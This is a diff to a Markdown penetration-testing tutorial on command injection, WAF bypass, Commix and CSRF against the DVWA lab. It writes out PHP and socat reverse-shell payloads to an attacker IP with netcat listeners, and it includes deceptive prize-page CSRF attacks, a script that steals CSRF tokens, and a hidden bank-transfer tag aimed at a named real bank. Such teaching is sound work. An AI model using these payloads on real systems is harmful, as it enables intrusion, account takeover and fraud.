@@ -1408,6 +1563,7 @@ sudo gunzip rockyou.txt.gz
 ```
 
 **Results:**
+
 ```
 [80][http-get-form] host: localhost
 login: admin   password: password
@@ -1422,6 +1578,7 @@ login: admin   password: password
 **Definition:** Tricking a computer into executing commands it wasn't supposed to by adding extra commands to input fields.
 
 **Example:**
+
 ```
 Normal: Enter your name → Processes name
 Malicious: Enter name + command → Executes both
@@ -1433,6 +1590,7 @@ Like filling out a form and sneaking in a secret note that makes the computer do
 ### How It Works
 
 **Vulnerable Code Pattern:**
+
 ```php
 // Takes user input
 $ip = $_REQUEST['ip'];
@@ -1446,6 +1604,7 @@ shell_exec("ping -c 4 $ip");
 ### Command Injection Operators
 
 **Linux/Unix:**
+
 - `;` - Execute next command
 - `&&` - Execute if previous succeeds
 - `||` - Execute if previous fails
@@ -1456,6 +1615,7 @@ shell_exec("ping -c 4 $ip");
 ### Practical: DVWA Command Injection
 
 **Setup:**
+
 ```
 1. Navigate to Command Injection
 2. Security Level: Low
@@ -1463,18 +1623,21 @@ shell_exec("ping -c 4 $ip");
 ```
 
 **Test Normal Functionality:**
+
 ```
 Input: 127.0.0.1
 Result: Ping successful (64 bytes...)
 ```
 
 **Test Basic Injection:**
+
 ```
 Input: 127.0.0.1 && whoami
 Result: BLOCKED by WAF
 ```
 
 **Bypass WAF with Pipe:**
+
 ```
 Input: 127.0.0.1 | whoami
 Result: Success! Shows username
@@ -1483,6 +1646,7 @@ Result: Success! Shows username
 ### Exploitation Commands
 
 **System Information:**
+
 ```bash
 # Check username
 127.0.0.1 | whoami
@@ -1511,6 +1675,7 @@ Result: Success! Shows username
 ### Source Code Analysis
 
 **View Source (DVWA Feature):**
+
 ```php
 // Vulnerable code
 if(isset($_POST['Submit'])) {
@@ -1522,6 +1687,7 @@ if(isset($_POST['Submit'])) {
 ```
 
 **Why Vulnerable:**
+
 1. Takes raw user input
 2. No sanitization
 3. Directly passes to shell_exec()
@@ -1530,6 +1696,7 @@ if(isset($_POST['Submit'])) {
 ### Getting Full Server Control
 
 **Step 1: Reconnaissance**
+
 ```bash
 # Check what's installed
 127.0.0.1 | which php
@@ -1540,6 +1707,7 @@ if(isset($_POST['Submit'])) {
 ```
 
 **Step 2: Get Your IP Address**
+
 ```bash
 # On attacker machine
 ip addr
@@ -1553,22 +1721,26 @@ inet 192.168.1.100/24
 Visit: https://revshells.com
 
 **Select:**
+
 - Language: PHP
 - IP: Your IP (192.168.1.100)
 - Port: 4444
 
 **Generated Payload:**
+
 ```php
 php -r '$sock=fsockopen("192.168.1.100",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
 ```
 
 **Step 4: Set Up Listener**
+
 ```bash
 # On attacker machine
 nc -lvnp 4444
 ```
 
 **Step 5: Execute Payload**
+
 ```
 Input in DVWA:
 127.0.0.1 | php -r '$sock=fsockopen("192.168.1.100",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
@@ -1597,26 +1769,27 @@ graph TD
 
 ## Complete Tool Arsenal
 
-| Tool | Purpose | Command Example |
-|------|---------|-----------------|
-| Subfinder | Public subdomain enumeration | `subfinder -d target.com -all` |
-| Amass | DNS enumeration + records | `amass enum -d target.com` |
-| DNSx | DNS bruteforcing | `dnsx -d target.com -w wordlist.txt` |
-| HTTPx | Probe live hosts | `cat domains.txt \| httpx` |
-| Nmap | Port scanning (detailed) | `nmap -sS -sV target.com` |
-| Naabu | Port scanning (fast) | `naabu -host target.com` |
-| Feroxbuster | Directory bruteforcing | `feroxbuster -u URL -w wordlist` |
-| Nuclei | Vulnerability scanning | `nuclei -target URL` |
-| Katana | Web crawling | `katana -u URL -jc` |
-| Wafw00f | Firewall detection | `wafw00f URL` |
-| Hydra | Brute force attacks | `hydra -l user -P pass.txt host service` |
-| Burp Suite | Request interception | GUI tool |
+| Tool        | Purpose                      | Command Example                          |
+| ----------- | ---------------------------- | ---------------------------------------- |
+| Subfinder   | Public subdomain enumeration | `subfinder -d target.com -all`           |
+| Amass       | DNS enumeration + records    | `amass enum -d target.com`               |
+| DNSx        | DNS bruteforcing             | `dnsx -d target.com -w wordlist.txt`     |
+| HTTPx       | Probe live hosts             | `cat domains.txt \| httpx`               |
+| Nmap        | Port scanning (detailed)     | `nmap -sS -sV target.com`                |
+| Naabu       | Port scanning (fast)         | `naabu -host target.com`                 |
+| Feroxbuster | Directory bruteforcing       | `feroxbuster -u URL -w wordlist`         |
+| Nuclei      | Vulnerability scanning       | `nuclei -target URL`                     |
+| Katana      | Web crawling                 | `katana -u URL -jc`                      |
+| Wafw00f     | Firewall detection           | `wafw00f URL`                            |
+| Hydra       | Brute force attacks          | `hydra -l user -P pass.txt host service` |
+| Burp Suite  | Request interception         | GUI tool                                 |
 
 ---
 
 ## Key Takeaways
 
 ### Reconnaissance Phase
+
 ✓ Use multiple tools (different results)
 ✓ Always combine + deduplicate results
 ✓ Prioritize targets with functionality
@@ -1625,6 +1798,7 @@ graph TD
 ✓ Verify live hosts before testing
 
 ### Exploitation Phase
+
 ✓ Start with default passwords
 ✓ Use brute force when needed
 ✓ Identify input validation weaknesses
@@ -1633,6 +1807,7 @@ graph TD
 ✓ Know your target's technology stack
 
 ### Security Bypasses
+
 ✓ Try different operators (&&, ||, |, ;)
 ✓ Test various encoding methods
 ✓ Use alternative commands
@@ -1644,6 +1819,7 @@ graph TD
 ## Important Warnings
 
 ⚠️ **Legal Boundaries:**
+
 - ONLY test in-scope targets
 - NEVER exceed program rules
 - Get explicit permission
@@ -1651,6 +1827,7 @@ graph TD
 - Don't cause DoS conditions
 
 ⚠️ **Technical Cautions:**
+
 - High thread counts = WAF blocking
 - Excessive requests = IP ban
 - Respect server resources
@@ -1662,6 +1839,7 @@ graph TD
 ## Practice Environments
 
 **Safe Practice:**
+
 - DVWA (Damn Vulnerable Web App)
 - HackTheBox
 - TryHackMe
@@ -1669,6 +1847,7 @@ graph TD
 - Local lab setups
 
 **Never Test On:**
+
 - Production systems without permission
 - Out-of-scope domains
 - Systems you don't own
@@ -1683,6 +1862,7 @@ graph TD
 ### Reverse Shell Setup
 
 **Step 1: Check Your IP Address**
+
 ```bash
 ip addr
 
@@ -1695,21 +1875,25 @@ inet 192.168.1.100/24
 Visit: **revshells.com**
 
 **Configuration:**
+
 - Language: PHP
 - Your IP: 192.168.1.100
 - Port: 1234
 
 **Generated Payload:**
+
 ```php
 php -r '$sock=fsockopen("192.168.1.100",1234);exec("/bin/bash -i <&3 >&3 2>&3");'
 ```
 
 **Step 3: Set Up Listener**
+
 ```bash
 nc -lvnp 1234
 ```
 
 **Flags:**
+
 - `-l`: Listen mode
 - `-v`: Verbose
 - `-n`: No DNS lookup
@@ -1718,6 +1902,7 @@ nc -lvnp 1234
 ### Executing the Attack
 
 **Inject Command:**
+
 ```
 Input: 127.0.0.1 | php -r '$sock=fsockopen("192.168.1.100",1234);exec("/bin/bash -i <&3 >&3 2>&3");'
 ```
@@ -1729,6 +1914,7 @@ Input: 127.0.0.1 | php -r '$sock=fsockopen("192.168.1.100",1234);exec("/bin/bash
 ### Bypassing WAF with Native Binaries
 
 **Why PHP Failed:**
+
 - WAF recognizes malicious PHP code
 - Blocks reverse shell attempts
 - Flags suspicious payloads
@@ -1755,12 +1941,14 @@ Input: 127.0.0.1 | php -r '$sock=fsockopen("192.168.1.100",1234);exec("/bin/bash
 ### Socat Exploitation
 
 **What is Socat?**
+
 - Similar to Netcat
 - "Swiss Army knife of networking"
 - Used for remote communication
 - Legitimate system binary (not flagged by WAF)
 
 **Why Socat Works:**
+
 - ✓ Legitimate binary (not malicious code)
 - ✓ Native communication tool
 - ✓ Not flagged by WAF
@@ -1769,11 +1957,13 @@ Input: 127.0.0.1 | php -r '$sock=fsockopen("192.168.1.100",1234);exec("/bin/bash
 **Generate Socat Payload:**
 
 Visit: revshells.com
+
 - Select: Socat
 - IP: Your IP
 - Port: 1234
 
 **Payload:**
+
 ```bash
 socat TCP:192.168.1.100:1234 EXEC:cmd,pty,stderr,setsid,sigint,sane
 ```
@@ -1781,11 +1971,13 @@ socat TCP:192.168.1.100:1234 EXEC:cmd,pty,stderr,setsid,sigint,sane
 **Important:** Change `cmd` to `bash` for Linux servers!
 
 **Corrected Payload:**
+
 ```bash
 socat TCP:192.168.1.100:1234 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 
 **Why?**
+
 - `cmd` = Windows Command Prompt
 - `bash` = Linux shell
 - Target is Linux server → Use bash
@@ -1793,11 +1985,13 @@ socat TCP:192.168.1.100:1234 EXEC:bash,pty,stderr,setsid,sigint,sane
 ### Successful Exploitation
 
 **Step 1: Start Listener**
+
 ```bash
 nc -lvnp 1234
 ```
 
 **Step 2: Inject Payload**
+
 ```
 Input: 127.0.0.1 | socat TCP:192.168.1.100:1234 EXEC:bash,pty,stderr,setsid,sigint,sane
 Submit
@@ -1806,6 +2000,7 @@ Submit
 **Result:** Connection received! 🎯
 
 **Verify Access:**
+
 ```bash
 # List files
 ls
@@ -1827,6 +2022,7 @@ cat index.php
 ### Medium Security Level
 
 **Source Code Analysis:**
+
 ```php
 // Medium level blacklist
 $blacklist = array('&&', ';');
@@ -1834,13 +2030,16 @@ $target = str_replace($blacklist, "", $target);
 ```
 
 **Blacklisted:**
+
 - `&&` (blocked)
 - `;` (blocked)
 
 **Still Works:**
+
 - `|` (pipe - NOT blacklisted)
 
 **Test:**
+
 ```
 127.0.0.1 | whoami
 # Still works!
@@ -1858,6 +2057,7 @@ $target = str_replace($blacklist, "", $target);
 **Full Name:** Command Injection Exploiter
 
 **Features:**
+
 - Automated OS command injection detection
 - Multiple injection techniques
 - Pseudo-terminal shell
@@ -1867,6 +2067,7 @@ $target = str_replace($blacklist, "", $target);
 ### Installation
 
 **From GitHub:**
+
 ```bash
 # Clone repository
 git clone https://github.com/commixproject/commix.git
@@ -1881,6 +2082,7 @@ python3 commix.py
 ### Usage with Burp Suite
 
 **Step 1: Intercept Request**
+
 ```
 1. Enable Burp Suite proxy
 2. Submit test request
@@ -1888,6 +2090,7 @@ python3 commix.py
 ```
 
 **Intercepted Request:**
+
 ```
 POST /vulnerabilities/exec/ HTTP/1.1
 Host: localhost
@@ -1897,6 +2100,7 @@ ip=127.0.0.1&Submit=Submit
 ```
 
 **Step 2: Extract Required Values**
+
 - URL: `/vulnerabilities/exec/`
 - Cookie: `PHPSESSID=...; security=medium`
 - Data: `ip=127.0.0.1&Submit=Submit`
@@ -1904,6 +2108,7 @@ ip=127.0.0.1&Submit=Submit
 ### Commix Command Structure
 
 **Basic Command:**
+
 ```bash
 python3 commix.py \
   -u "http://localhost/vulnerabilities/exec/" \
@@ -1912,6 +2117,7 @@ python3 commix.py \
 ```
 
 **Flags Explained:**
+
 - `-u`: Target URL
 - `--cookie`: Cookie header
 - `--data`: POST parameters
@@ -1921,6 +2127,7 @@ python3 commix.py \
 ### Execution Results
 
 **Detection:**
+
 ```
 Testing connection to target URL...
 POST parameter 'ip' is vulnerable!
@@ -1928,6 +2135,7 @@ Do you want a Pseudo-Terminal shell? [Y/n] Y
 ```
 
 **Shell Access:**
+
 ```
 commix(os_shell) > ls
 help  index.php  source
@@ -1944,6 +2152,7 @@ commix(os_shell) > pwd
 ### Advanced Features
 
 **Reverse Shell Option:**
+
 ```bash
 # Commix has built-in reverse shell
 # Check documentation for --reverse-shell flag
@@ -1951,12 +2160,14 @@ python3 commix.py --reverse-shell
 ```
 
 **Benefits:**
+
 - Automatic detection
 - Multiple bypass techniques
 - User-friendly interface
 - No manual payload crafting
 
 **Limitations:**
+
 - Slower response time
 - Less stable than manual shells
 - May miss complex bypasses
@@ -1984,6 +2195,7 @@ python3 commix.py --reverse-shell
 **Definition:** Tricking someone into performing actions online without their knowledge.
 
 **Real-World Scenario:**
+
 ```
 You're logged into your bank account
 Checking balance, browsing normally
@@ -1997,6 +2209,7 @@ Money transferred without your knowledge!
 ### How CSRF Works
 
 **Attack Flow:**
+
 ```
 1. Victim logs into website (bank, social media)
 2. Session cookie stored in browser
@@ -2012,12 +2225,14 @@ Money transferred without your knowledge!
 ### CSRF Attack Requirements
 
 **Prerequisites:**
+
 1. ✓ Victim must be authenticated
 2. ✓ Valid session cookie exists
 3. ✓ No CSRF protection implemented
 4. ✓ Victim visits attacker's page
 
 **What Makes It Dangerous:**
+
 - Uses legitimate session
 - No password required
 - Victim unaware
@@ -2026,6 +2241,7 @@ Money transferred without your knowledge!
 ### Real-World Impact
 
 **Possible Attacks:**
+
 - Change account password
 - Transfer money
 - Delete account
@@ -2037,34 +2253,41 @@ Money transferred without your knowledge!
 **Example Scenarios:**
 
 **Banking:**
+
 ```html
 <!-- Attacker's malicious page -->
 <img src="https://bank.com/transfer?to=attacker&amount=10000" />
 ```
 
 **Social Media:**
+
 ```html
 <!-- Change email -->
 <img src="https://social.com/settings/email?new=hacker@evil.com" />
 ```
 
 **Password Change:**
+
 ```html
 <form action="https://site.com/change-password" method="POST">
-    <input type="hidden" name="new_password" value="hacked123" />
+  <input type="hidden" name="new_password" value="hacked123" />
 </form>
-<script>document.forms[0].submit();</script>
+<script>
+  document.forms[0].submit()
+</script>
 ```
 
 ### CSRF vs XSS
 
 **CSRF:**
+
 - Uses victim's session
 - Performs actions AS victim
 - No code execution on site
 - External attack page
 
 **XSS:**
+
 - Executes code ON site
 - Steals data directly
 - More flexible
@@ -2073,20 +2296,23 @@ Money transferred without your knowledge!
 ### Protection Mechanisms
 
 **CSRF Tokens:**
+
 ```html
 <form method="POST">
-    <input type="hidden" name="csrf_token" value="random_unique_token" />
-    <input type="password" name="new_password" />
+  <input type="hidden" name="csrf_token" value="random_unique_token" />
+  <input type="password" name="new_password" />
 </form>
 ```
 
 **How Tokens Work:**
+
 1. Server generates unique token per session
 2. Token included in forms
 3. Server validates token on submission
 4. Rejects requests without valid token
 
 **Other Protections:**
+
 - SameSite cookie attribute
 - Referer header checking
 - Custom request headers
@@ -2095,6 +2321,7 @@ Money transferred without your knowledge!
 ### Testing for CSRF
 
 **Manual Testing:**
+
 1. Identify sensitive action (password change)
 2. Capture legitimate request
 3. Remove/modify CSRF token
@@ -2102,12 +2329,14 @@ Money transferred without your knowledge!
 5. Check if action succeeds
 
 **Vulnerable Response:**
+
 ```
 Status: 200 OK
 Password changed successfully!
 ```
 
 **Secure Response:**
+
 ```
 Status: 403 Forbidden
 Invalid CSRF token
@@ -2120,6 +2349,7 @@ Invalid CSRF token
 ### Setup
 
 **Navigate to CSRF:**
+
 ```
 DVWA → CSRF section
 Security Level: Low
@@ -2128,11 +2358,12 @@ Security Level: Low
 **Functionality:** Password change form
 
 **Form Analysis:**
+
 ```html
 <form>
-    <input type="password" name="password_new" />
-    <input type="password" name="password_conf" />
-    <input type="submit" name="Change" value="Change" />
+  <input type="password" name="password_new" />
+  <input type="password" name="password_conf" />
+  <input type="submit" name="Change" value="Change" />
 </form>
 ```
 
@@ -2141,6 +2372,7 @@ Security Level: Low
 **Step 1: Intercept Request with Burp Suite**
 
 Enable Burp:
+
 ```
 1. FoxyProxy → Burp
 2. Intercept: ON
@@ -2149,12 +2381,14 @@ Enable Burp:
 ```
 
 **Captured Request:**
+
 ```
 GET /vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change
 Cookie: PHPSESSID=...; security=low
 ```
 
 **Analysis:**
+
 - Method: GET
 - Parameters visible in URL
 - No CSRF token
@@ -2163,23 +2397,27 @@ Cookie: PHPSESSID=...; security=low
 **Step 2: Craft Malicious Payload**
 
 **HTML Payload:**
+
 ```html
 <!DOCTYPE html>
 <html>
-<head>
+  <head>
     <title>Win a Free iPhone!</title>
-</head>
-<body>
+  </head>
+  <body>
     <h1>Congratulations! Click to claim prize!</h1>
 
     <!-- Hidden malicious request -->
-    <img src="http://localhost/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change"
-         style="display:none;" />
-</body>
+    <img
+      src="http://localhost/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change"
+      style="display:none;"
+    />
+  </body>
 </html>
 ```
 
 **How It Works:**
+
 1. Victim clicks "Free iPhone" link
 2. Page loads
 3. Hidden image loads
@@ -2190,6 +2428,7 @@ Cookie: PHPSESSID=...; security=low
 **Step 3: Host Malicious Page**
 
 **Simple HTTP Server:**
+
 ```bash
 # Python 3
 python3 -m http.server 8000
@@ -2205,18 +2444,21 @@ python -m SimpleHTTPServer 8000
 **Attack Scenarios:**
 
 **Email:**
+
 ```
 Subject: You've won a prize!
 Body: Click here to claim: http://attacker.com/prize.html
 ```
 
 **Social Media:**
+
 ```
 Check out this amazing deal!
 [malicious link]
 ```
 
 **Chat Message:**
+
 ```
 LOL look at this funny video 😂
 [malicious link]
@@ -2225,6 +2467,7 @@ LOL look at this funny video 😂
 ### Attack Demonstration
 
 **Scenario:**
+
 ```
 1. Admin logged into DVWA
 2. Receives email: "Free gift!"
@@ -2236,6 +2479,7 @@ LOL look at this funny video 😂
 ```
 
 **Verify:**
+
 ```
 Try logging in:
 Username: admin
@@ -2246,11 +2490,13 @@ Success! Account compromised
 ### Medium Security Level
 
 **Navigate to Source:**
+
 ```
 View Source → Medium level
 ```
 
 **Code Analysis:**
+
 ```php
 if (isset($_SERVER['HTTP_REFERER'])) {
     if (strpos($_SERVER['HTTP_REFERER'],
@@ -2267,6 +2513,7 @@ if (isset($_SERVER['HTTP_REFERER'])) {
 **Bypass:** Host malicious page on same domain
 
 **Exploit:**
+
 ```html
 <!-- Upload to vulnerable upload point -->
 <!-- Or use open redirect vulnerability -->
@@ -2276,6 +2523,7 @@ if (isset($_SERVER['HTTP_REFERER'])) {
 ### High Security Level
 
 **Code Analysis:**
+
 ```php
 if (isset($_POST['csrf_token'])) {
     if ($_POST['csrf_token'] === $_SESSION['csrf_token']) {
@@ -2289,6 +2537,7 @@ if (isset($_POST['csrf_token'])) {
 **Protection:** CSRF token validation
 
 **Bypass Attempts:**
+
 1. ❌ Remove token
 2. ❌ Use old token
 3. ❌ Use empty token
@@ -2297,20 +2546,21 @@ if (isset($_POST['csrf_token'])) {
 **Note:** Proper CSRF protection cannot be bypassed (in isolation)
 
 **Combined Attack:** XSS + CSRF
+
 ```javascript
 // Use XSS to steal CSRF token
 fetch('/csrf-page')
-    .then(r => r.text())
-    .then(html => {
-        // Extract token from HTML
-        let token = html.match(/csrf_token.*value="(.*)"/)[1];
+  .then((r) => r.text())
+  .then((html) => {
+    // Extract token from HTML
+    let token = html.match(/csrf_token.*value="(.*)"/)[1]
 
-        // Submit with stolen token
-        fetch('/change-password', {
-            method: 'POST',
-            body: 'password=hacked&csrf_token=' + token
-        });
-    });
+    // Submit with stolen token
+    fetch('/change-password', {
+      method: 'POST',
+      body: 'password=hacked&csrf_token=' + token,
+    })
+  })
 ```
 
 ---
@@ -2318,33 +2568,40 @@ fetch('/csrf-page')
 ## CSRF Attack Vectors
 
 ### Image Tag
+
 ```html
 <img src="http://site.com/action?param=value" />
 ```
 
 ### Hidden Form
+
 ```html
 <form id="csrf" action="http://site.com/action" method="POST">
-    <input type="hidden" name="param" value="value" />
+  <input type="hidden" name="param" value="value" />
 </form>
-<script>document.getElementById('csrf').submit();</script>
+<script>
+  document.getElementById('csrf').submit()
+</script>
 ```
 
 ### Iframe
+
 ```html
 <iframe src="http://site.com/action?param=value" style="display:none;"></iframe>
 ```
 
 ### JavaScript Fetch
+
 ```javascript
 fetch('http://site.com/action', {
-    method: 'POST',
-    credentials: 'include', // Include cookies
-    body: 'param=value'
-});
+  method: 'POST',
+  credentials: 'include', // Include cookies
+  body: 'param=value',
+})
 ```
 
 ### Link
+
 ```html
 <a href="http://site.com/delete-account">Click for free prize!</a>
 ```
@@ -2356,6 +2613,7 @@ fetch('http://site.com/action', {
 ### For Developers
 
 **1. CSRF Tokens (Primary Defense)**
+
 ```php
 // Generate token
 $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
@@ -2367,6 +2625,7 @@ if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
 ```
 
 **2. SameSite Cookies**
+
 ```php
 setcookie('session', $value, [
     'samesite' => 'Strict' // or 'Lax'
@@ -2374,15 +2633,17 @@ setcookie('session', $value, [
 ```
 
 **3. Custom Headers**
+
 ```javascript
 fetch('/api/action', {
-    headers: {
-        'X-Requested-With': 'XMLHttpRequest'
-    }
-});
+  headers: {
+    'X-Requested-With': 'XMLHttpRequest',
+  },
+})
 ```
 
 **4. Double Submit Cookies**
+
 ```
 Cookie: csrf_token=abc123
 POST data: csrf_token=abc123
@@ -2390,6 +2651,7 @@ Verify: Cookie value === POST value
 ```
 
 **5. Re-authentication**
+
 ```
 Sensitive actions require password:
 - Change password
@@ -2402,6 +2664,7 @@ Sensitive actions require password:
 **Banking Scenario - State Bank of India:**
 
 **Setup:**
+
 ```
 1. You're logged into SBI online banking
 2. Checking your balance
@@ -2412,11 +2675,13 @@ Sensitive actions require password:
 **Attack Flow:**
 
 **Step 1: Attacker's Knowledge**
+
 - ✓ Knows you use SBI
 - ✓ Knows SBI has CSRF vulnerability
 - ✓ Crafts malicious request
 
 **Step 2: Social Engineering**
+
 ```
 Attacker sends you:
 - Email: "Check this funny image!"
@@ -2425,19 +2690,23 @@ Attacker sends you:
 ```
 
 **Step 3: Hidden Attack**
+
 ```html
 <!-- What you see -->
 <img src="funny-cat.jpg" />
 
 <!-- What actually happens -->
-<img src="https://onlinesbi.com/transfer?
+<img
+  src="https://onlinesbi.com/transfer?
     to=attacker_account&
     amount=50000&
     confirm=yes"
-    style="display:none;" />
+  style="display:none;"
+/>
 ```
 
 **Step 4: Automatic Execution**
+
 ```
 You click the link/image
 ↓
@@ -2455,6 +2724,7 @@ You don't even know it happened!
 ```
 
 **Why It Works:**
+
 1. ✓ You're already logged in (valid session)
 2. ✓ Browser automatically sends cookies
 3. ✓ SBI doesn't verify request origin
@@ -2464,6 +2734,7 @@ You don't even know it happened!
 **The Analogy Explained:**
 
 **Letter Scenario:**
+
 ```
 You're on vacation
 Someone writes letter in your name
@@ -2476,6 +2747,7 @@ You never wrote it!
 ```
 
 **Technical Translation:**
+
 ```
 You're logged in (on vacation with active session)
 Attacker crafts request in your name
@@ -2490,6 +2762,7 @@ You never initiated it!
 **Single Click = Account Compromise**
 
 **Possible Damages:**
+
 - 💰 **Banking:** Transfer all money
 - 🔑 **Passwords:** Change without knowledge
 - 📧 **Email:** Change recovery email
@@ -2501,6 +2774,7 @@ You never initiated it!
 **Real Impact Examples:**
 
 **1. Financial Loss**
+
 ```
 One click → ₹50,000 transferred
 One click → Credit card maxed out
@@ -2508,6 +2782,7 @@ One click → Investment sold at loss
 ```
 
 **2. Account Takeover**
+
 ```
 Password changed → You're locked out
 Email changed → Can't recover
@@ -2515,6 +2790,7 @@ Phone number changed → No 2FA
 ```
 
 **3. Reputation Damage**
+
 ```
 Offensive posts made in your name
 Spam sent to all contacts
@@ -2526,11 +2802,13 @@ Illegal content shared
 **What Makes It Unique:**
 
 **1. Uses Trust**
+
 - Exploits browser's trust in cookies
 - Exploits server's trust in authenticated users
 - No password stealing needed
 
 **2. Invisible Attack**
+
 ```
 ✓ No phishing page
 ✓ No credential theft
@@ -2539,6 +2817,7 @@ Illegal content shared
 ```
 
 **3. Browser Behavior**
+
 ```
 Normal behavior: Browser sends cookies automatically
 CSRF exploits: This automatic cookie sending
@@ -2546,6 +2825,7 @@ Result: Server can't distinguish legitimate vs malicious
 ```
 
 **4. Social Engineering**
+
 ```
 Must trick victim to:
 - Click link
@@ -2556,17 +2836,18 @@ While logged into target site
 
 ### CSRF vs Other Attacks
 
-| Attack | Password Needed | User Action | Detection |
-|--------|----------------|-------------|-----------|
-| CSRF | ❌ No | Click link | Hard |
-| Phishing | ✅ Yes | Enter credentials | Medium |
-| Brute Force | ✅ Yes | None | Easy |
-| Session Hijacking | ❌ No | None | Hard |
-| XSS | ❌ No | Visit page | Medium |
+| Attack            | Password Needed | User Action       | Detection |
+| ----------------- | --------------- | ----------------- | --------- |
+| CSRF              | ❌ No           | Click link        | Hard      |
+| Phishing          | ✅ Yes          | Enter credentials | Medium    |
+| Brute Force       | ✅ Yes          | None              | Easy      |
+| Session Hijacking | ❌ No           | None              | Hard      |
+| XSS               | ❌ No           | Visit page        | Medium    |
 
 ### Protection Importance
 
 **For Websites:**
+
 ```
 Without CSRF protection:
 - Any logged-in user vulnerable
@@ -2582,6 +2863,7 @@ With CSRF protection:
 ```
 
 **For Users:**
+
 ```
 Risk factors:
 - Clicking unknown links while logged in
@@ -2603,6 +2885,7 @@ Protection:
 ### Initial Setup
 
 **Navigate to CSRF Module:**
+
 ```
 DVWA Dashboard → CSRF
 Security Level: Low
@@ -2610,6 +2893,7 @@ Feature: Password Change Form
 ```
 
 **Interface:**
+
 ```
 New password: [________]
 Confirm password: [________]
@@ -2619,6 +2903,7 @@ Confirm password: [________]
 ### Understanding the Vulnerability
 
 **Legitimate Use:**
+
 ```
 1. User opens password change page
 2. Enters new password
@@ -2627,6 +2912,7 @@ Confirm password: [________]
 ```
 
 **Test Normal Functionality:**
+
 ```
 New password: test123
 Confirm password: test123
@@ -2635,6 +2921,7 @@ Result: Password changed successfully
 ```
 
 **Verify:**
+
 ```
 Logout
 Login with: admin / test123
@@ -2644,6 +2931,7 @@ Success! ✓
 ### Low Security - Source Code Analysis
 
 **View Source:**
+
 ```php
 <?php
 if (isset($_GET['password_new']) && isset($_GET['password_conf'])) {
@@ -2660,6 +2948,7 @@ if (isset($_GET['password_new']) && isset($_GET['password_conf'])) {
 ```
 
 **Vulnerabilities Identified:**
+
 1. ❌ Uses GET method (visible in URL)
 2. ❌ No CSRF token
 3. ❌ No origin checking
@@ -2671,6 +2960,7 @@ if (isset($_GET['password_new']) && isset($_GET['password_conf'])) {
 **Step 1: Capture Legitimate Request**
 
 **Using Burp Suite:**
+
 ```
 1. Enable intercept
 2. Change password to: newpass123
@@ -2678,6 +2968,7 @@ if (isset($_GET['password_new']) && isset($_GET['password_conf'])) {
 ```
 
 **Captured Request:**
+
 ```
 GET /vulnerabilities/csrf/?password_new=newpass123&password_conf=newpass123&Change=Change HTTP/1.1
 Host: localhost
@@ -2685,6 +2976,7 @@ Cookie: PHPSESSID=abc123xyz; security=low
 ```
 
 **Extract URL:**
+
 ```
 http://localhost/vulnerabilities/csrf/?password_new=newpass123&password_conf=newpass123&Change=Change
 ```
@@ -2692,104 +2984,111 @@ http://localhost/vulnerabilities/csrf/?password_new=newpass123&password_conf=new
 **Step 2: Create Malicious HTML Page**
 
 **File: malicious.html**
+
 ```html
 <!DOCTYPE html>
 <html>
-<head>
+  <head>
     <title>🎁 Congratulations! You Won an iPhone 15! 🎁</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 50px;
-        }
-        .prize-box {
-            background: white;
-            color: #333;
-            padding: 40px;
-            border-radius: 20px;
-            max-width: 600px;
-            margin: 0 auto;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-        }
-        h1 { color: #667eea; }
-        .btn {
-            background: #28a745;
-            color: white;
-            padding: 15px 40px;
-            border: none;
-            border-radius: 10px;
-            font-size: 20px;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        .btn:hover { background: #218838; }
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: white;
+        padding: 50px;
+      }
+      .prize-box {
+        background: white;
+        color: #333;
+        padding: 40px;
+        border-radius: 20px;
+        max-width: 600px;
+        margin: 0 auto;
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+      }
+      h1 {
+        color: #667eea;
+      }
+      .btn {
+        background: #28a745;
+        color: white;
+        padding: 15px 40px;
+        border: none;
+        border-radius: 10px;
+        font-size: 20px;
+        cursor: pointer;
+        margin-top: 20px;
+      }
+      .btn:hover {
+        background: #218838;
+      }
     </style>
-</head>
-<body>
+  </head>
+  <body>
     <div class="prize-box">
-        <h1>🎉 CONGRATULATIONS! 🎉</h1>
-        <h2>You are our 1,000,000th visitor!</h2>
-        <p>You've won a <strong>FREE iPhone 15 Pro Max</strong>!</p>
-        <p>Click below to claim your prize NOW!</p>
-        <button class="btn" onclick="claimPrize()">
-            Claim My iPhone! 📱
-        </button>
+      <h1>🎉 CONGRATULATIONS! 🎉</h1>
+      <h2>You are our 1,000,000th visitor!</h2>
+      <p>You've won a <strong>FREE iPhone 15 Pro Max</strong>!</p>
+      <p>Click below to claim your prize NOW!</p>
+      <button class="btn" onclick="claimPrize()">Claim My iPhone! 📱</button>
 
-        <!-- Hidden CSRF attack -->
-        <img id="csrf-img" style="display:none;" />
+      <!-- Hidden CSRF attack -->
+      <img id="csrf-img" style="display:none;" />
     </div>
 
     <script>
-        function claimPrize() {
-            // Show fake loading
-            document.querySelector('.btn').innerHTML = 'Processing...';
+      function claimPrize() {
+        // Show fake loading
+        document.querySelector('.btn').innerHTML = 'Processing...'
 
-            // Execute CSRF attack
-            document.getElementById('csrf-img').src =
-                'http://localhost/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change';
+        // Execute CSRF attack
+        document.getElementById('csrf-img').src =
+          'http://localhost/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change'
 
-            // Redirect after delay
-            setTimeout(() => {
-                alert('Congratulations! Your prize will arrive in 2-3 weeks!');
-                window.location.href = 'https://google.com';
-            }, 2000);
-        }
+        // Redirect after delay
+        setTimeout(() => {
+          alert('Congratulations! Your prize will arrive in 2-3 weeks!')
+          window.location.href = 'https://google.com'
+        }, 2000)
+      }
     </script>
-</body>
+  </body>
 </html>
 ```
 
 **Alternative - Silent Attack (No User Interaction):**
+
 ```html
